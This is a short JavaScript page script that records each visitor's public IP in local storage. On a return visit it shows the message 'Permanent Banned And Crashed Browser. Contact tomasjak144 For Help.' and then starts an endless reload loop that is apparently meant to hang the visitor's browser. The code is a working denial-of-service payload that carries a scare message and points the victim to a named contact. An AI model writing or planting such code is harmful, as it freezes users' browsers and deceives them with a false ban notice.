async function getIPAddress() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error('Error fetching IP address:', error);
      return null;
    }
  }
  
  window.onload = async function() {
    try {
      const ip = await getIPAddress();
      if (ip) {
        const visitedIPs = JSON.parse(localStorage.getItem('visitedIPs')) || [];
        if (visitedIPs.includes(ip)) {
          const blackScreen = document.querySelector('.black-screen');
          blackScreen.textContent = "Permanent Banned And Crashed Browser. Contact tomasjak144 For Help.";
          // Start the refresh loop after showing the message
          setTimeout(function(){
            while(1) location.reload(1);
          }, 1000);
        } else {
          visitedIPs.push(ip);
          localStorage.setItem('visitedIPs', JSON.stringify(visitedIPs));
        }
      }
    } catch (error) {
      console.error('Error on page load:', error);
    }
  };
  